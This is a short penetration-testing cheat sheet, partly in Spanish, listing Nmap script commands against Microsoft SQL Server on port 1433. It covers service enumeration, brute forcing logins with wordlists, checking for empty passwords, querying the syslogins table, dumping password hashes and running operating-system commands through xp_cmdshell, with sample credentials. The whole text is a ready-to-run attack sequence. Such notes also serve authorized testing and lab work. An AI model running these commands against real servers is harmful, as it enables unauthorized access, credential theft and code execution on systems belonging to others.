MSSQL Nmap Script 1433 

```
nmap ip -sV -p 1433 --script ms-sql-info
```
 
```
nmap ip -sV -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
```

```
nmap ip -sV -p 1433 --script ms-sql-brute --script-args userdb=/dir/user.txt,passdb=/dir/pass.txt  
```

Pass Vacios
```
nmap ip -sV -p 1433 --script ms-sql-empty-password 
```

Correr una query
```
nmap ip -sV -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt 
```

```
nmap ip -sV -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamarias 
```

Ejecutar codigo
```
nmap ip -sV -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
```
